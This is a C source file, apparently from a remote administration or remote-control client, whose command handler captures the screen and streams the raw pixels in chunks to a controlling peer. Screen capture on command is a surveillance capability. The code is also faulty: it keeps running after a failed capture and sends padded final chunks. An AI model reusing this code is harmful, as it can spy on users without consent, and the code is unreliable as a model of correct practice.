#include <stdlib.h>
#include <string.h>
#include "types.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"
#include "screenshot.h"

#define COMMAND_SCREEN_GET_DATA 0x6
#define COMMAND_SCREEN_GET_END 0xB

int command_Screen_Get(uint8* msg)
{
	uint32 _scWidth = (msg[0] & 0xFF) | (msg[1] & 0xFF) << 8 | (msg[2] & 0xFF) << 16 | (msg[3] & 0xFF) << 24;
	uint32 _scHeight = (msg[4] & 0xFF) | (msg[5] & 0xFF) << 8 | (msg[6] & 0xFF) << 16 | (msg[7] & 0xFF) << 24;

	int scWidth;
	int scHeight;

	uint8* screenData = screenshot_Take(_scWidth, _scHeight, &scWidth, &scHeight);

	if(!screenData)
	{
		free(screenData);

		if(net_SendCmd((uint8*)" ", 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			return NET_LOST_CONNECTION;
		}
	}

	uint32 size = scWidth * scHeight * 3;
	uint8 s_size[9];
	s_size[0] = (scWidth) & 0xFF;
	s_size[1] = (scWidth >> 8) & 0xFF;
	s_size[2] = (scWidth >> 16) & 0xFF;
	s_size[3] = (scWidth >> 24) & 0xFF;
	s_size[4] = (scHeight) & 0xFF;
	s_size[5] = (scHeight >> 8) & 0xFF;
	s_size[6] = (scHeight >> 16) & 0xFF;
	s_size[7] = (scHeight >> 24) & 0xFF;
	s_size[8] = 0;

	if(net_SendCmd(s_size, 9, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
	{
		free(screenData);

		return NET_LOST_CONNECTION;
	}

	uint32 i;
	uint32 bufferIndex = 0;
	uint8 buffer[NET_BUFFSIE_FOR_FILE];
	memset(buffer, 0, NET_BUFFSIE_FOR_FILE);
	uint8 *rmsg;

	for(i = 0; i != size; i++)
	{
		if(bufferIndex >= NET_BUFFSIE_FOR_FILE)
		{
			if(net_SendCmd(buffer, NET_BUFFSIE_FOR_FILE, COMMAND_SCREEN_GET_DATA) == NET_LOST_CONNECTION)
			{
				free(screenData);

				return NET_LOST_CONNECTION;
			}

			if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
			{
				free(screenData);
				free(rmsg);

				return NET_LOST_CONNECTION;
			}

			free(rmsg);
			memset(buffer, 0, NET_BUFFSIE_FOR_FILE);
			bufferIndex = 0;
		}

		buffer[bufferIndex++] = screenData[i];
	}

	free(screenData);

	if(bufferIndex != 0 && bufferIndex <= NET_BUFFSIE_FOR_FILE)
	{
		if(net_SendCmd(buffer, NET_BUFFSIE_FOR_FILE, COMMAND_SCREEN_GET_DATA) == NET_LOST_CONNECTION)
		{
			return NET_LOST_CONNECTION;
		}

		if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
		{
			free(rmsg);

			return NET_LOST_CONNECTION;
		}

		free(rmsg);
		memset(buffer, 0, NET_BUFFSIE_FOR_FILE);
		bufferIndex = 0;
	}

	if(net_SendCmd((uint8*)" ", 1, COMMAND_SCREEN_GET_END) == NET_LOST_CONNECTION)
	{
		return NET_LOST_CONNECTION;
	}

	return COMMANDS_SUCC;
}
